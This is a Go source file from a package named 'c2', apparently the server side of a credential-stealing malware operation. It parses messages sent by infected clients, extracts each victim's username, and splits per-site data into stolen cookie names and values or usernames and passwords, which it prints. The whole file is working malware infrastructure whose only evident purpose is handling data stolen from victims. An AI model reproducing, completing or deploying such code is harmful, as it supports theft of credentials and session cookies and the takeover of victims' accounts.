package c2

import (
	"errors"
	"fmt"
	"log"
	"strings"
)

/**
*	Prettify incoming data
 */
func PrettifyIncomingStolenData(jsonObject map[string]interface{}, username string) error {

	// these should match the client constants
	// variable names the same in server and client
	const TERMINATOR = ";>|;}|;|£ "
	const KEY_VAL_DELIM = "|<£||>"

	fmt.Println("Incoming data from username: ", username)

	for site, value := range jsonObject {
		valueStr, ok := value.(string)
		if !ok {
			log.Printf("Error - Value for key %v is not a string, skipping. Value is: %v\n", site, value)
			continue
		}

		// split the substrings by ";"
		substrings := strings.Split(valueStr, TERMINATOR)

		for _, substring := range substrings {

			// trim whitespace to help out with less errors in the below parsing
			// helps to prevent splitting when we have no more ||| to split on
			trimmedSubstring := strings.TrimSpace(substring)
			if trimmedSubstring == "" {
				continue
			}

			// now split on ||| to pull out cookie name / username ||| value / password
			parts := strings.Split(substring, KEY_VAL_DELIM)

			// handle errors
			if len(parts) == 0 || len(parts) == 1 && parts[0] == "" {
				continue
			} else if len(parts) != 2 {
				// handle errors where a semicolon is found within the body of a string, e.g. in a password - this will cause
				// the function to chop up the password as substrings
				log.Printf("Invalid format: expected 2 parts but found %d in substring '%s', parts: %v\n", len(parts), substring, parts)
				continue
			}

			// print left and right part
			fmt.Printf("Site: %s, Cookie name / username: %s, Cookie value / password: %s\n", site, parts[0], parts[1])
		}

		// console formatting
		fmt.Println()

	}

	fmt.Println()
	fmt.Println()
	fmt.Printf("Summary of sites data extracted for user %s:\n", username)

	for key := range jsonObject {
		fmt.Println(key)
	}

	return nil
}

// get username from incoming message
func GetUsername(dataString string) string {
	usernameParts := strings.SplitN(dataString, "\r\n", 2)
	if len(usernameParts) > 1 {
		res := usernameParts[0]

		// check the result is greater than 2 chars to prevent panicking
		if len(res) > 8 {
			return res[8:] // trim "From: a_"
		}
	}

	return "" // if we cannot extract
}

// search for first instance of {" indicating start of json object in input string from client
func GetJSONBodyFromComms(dataString string) (string, error) {
	jsonStartingIndex := strings.Index(dataString, "{\"")
	if jsonStartingIndex == -1 {
		return "", errors.New("could not get starting index of JSON body")
	}

	return dataString[jsonStartingIndex:], nil
}
